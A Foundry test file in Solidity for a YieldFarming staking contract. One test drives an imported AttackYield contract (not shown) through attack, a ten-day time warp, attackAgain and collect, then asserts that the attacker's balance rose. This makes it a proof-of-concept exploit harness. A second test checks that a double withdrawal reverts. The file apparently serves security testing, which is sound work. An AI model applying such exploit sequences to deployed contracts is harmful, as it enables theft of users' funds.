// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {YieldFarming, AttackYield} from "../src/YieldFarming.sol";

contract YieldFarmingTest is Test {
    YieldFarming yieldFarming;
    AttackYield attackYield;

    uint256 public constant STARTING_BALANCE = 10 ether;

    address attacker = makeAddr("attacker");

    function setUp() public {
        yieldFarming = new YieldFarming();
        attackYield = new AttackYield(address(yieldFarming));

        vm.deal(attacker, STARTING_BALANCE);
        deal(address(yieldFarming), 10 ether);
        deal(address(attackYield), 10 ether);
    }

    function testWithdrawStakeMoreFaster() public {
        vm.startPrank(attacker);

        uint256 beforeAttackerBalance = address(attacker).balance;
        attackYield.attack{value: 1 ether}();
        console.log(address(attacker).balance);
        (uint256 amount, uint256 timestamp, bool withdrawn) = yieldFarming
            .stakes(attacker);
        console.log("Withdrawn Status after calling stake():", withdrawn);

        vm.warp(block.timestamp + 10 days);
        console.log("Block Timestamp After Warp:", block.timestamp);
        attackYield.attackAgain();
        attackYield.collect();
        vm.stopPrank();
        uint256 afterAttackerBalance = address(attacker).balance;

        console.log(beforeAttackerBalance, afterAttackerBalance);
        console.log(address(attackYield).balance);

        assert(beforeAttackerBalance < afterAttackerBalance);
    }

    function testWithdrawTwiceReverts() public {
        vm.startPrank(attacker);

        yieldFarming.stake{value: 1 ether}();
        yieldFarming.withdraw();

        vm.expectRevert();
        yieldFarming.withdraw();
        vm.stopPrank();
    }
}
